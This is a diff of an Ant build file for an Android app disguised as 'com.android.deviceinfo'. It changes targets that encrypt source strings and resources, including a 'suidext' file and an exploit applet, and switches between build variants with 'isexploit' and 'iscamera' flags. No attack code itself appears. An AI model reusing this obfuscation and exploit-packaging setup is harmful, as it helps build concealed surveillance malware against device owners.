@@ -83,29 +83,11 @@
 	</target>
 
 	<target name="encrypt-messages" depends="salt">
-		<stringencrypt dest="build/src_enc">
+		<stringencrypt dest="gen/enc" baseDir="src">
 			<path>
 				<fileset dir="src/" includes="**/*.java" />
 			</path>
 		</stringencrypt>
-	</target>
-
-	<target name="encrypt-messages-old" depends="salt">
-
-		<java classname="x.StringEncryptor" classpath="build/classes-datacreator;build/classes-exploit" failOnError="true">
-			<arg value="src-exploit/x/XAppletW.java" />
-			<arg value="build/src-encoded/x/XAppletW.java" />
-		</java>
-
-		<mkdir dir="assets" />
-
-		<delete file="res/raw/messages.bin" />
-		<delete file="assets/m.bin" />
-
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="assets/m.bin" />
-		<delete file="res/raw/statusdb.bin" />
-		<delete file="assets/s.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/s.bin" />
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -164,7 +146,7 @@
 			<switch value="@{kind}">
 				<case value="debug">
 					<echo message="set debug" />
-					<antcall target="libsnoexp" />
+					
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -174,7 +156,7 @@
 				</case>
 				<case value="release">
 					<echo message="set release" />
-					<antcall target="libsnoexp" />
+					
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -184,7 +166,7 @@
 				</case>
 				<case value="merge">
 					<echo message="set merge" />
-					<antcall target="libsnoexp" />
+					
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -194,7 +176,7 @@
 				</case>
 				<case value="merge_debug">
 					<echo message="set merge" />
-					<antcall target="libsnoexp" />
+				
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
 					<var name="iscamera" value="false" />
@@ -204,7 +186,7 @@
 				</case>
 				<case value="exploit">
 					<echo message="set exploit" />
-					<antcall target="libsexp" />
+				
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
 					<var name="iscamera" value="false" />
@@ -242,7 +224,7 @@
 
 			<echo message="copy resources and Cfg" />
 
-			<copy file="preprocess/Cfg.java" toFile="src_enc/com/android/deviceinfo/auto/Cfg.java" overwrite="true">
+			<copy file="preprocess/Cfg.java" toFile="src/com/android/deviceinfo/auto/Cfg.java" overwrite="true">
 				<filterset>
 					<filter token="BUILD_ID" value="${build.number}" />
 					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
@@ -262,6 +244,8 @@
 					<filter token="RNDMSG" value="${randomKeyMessages}" />
 				</filterset>
 			</copy>
+			
+			<antcall target="libsnoexp" />
 
 		</sequential>
 	</macrodef>
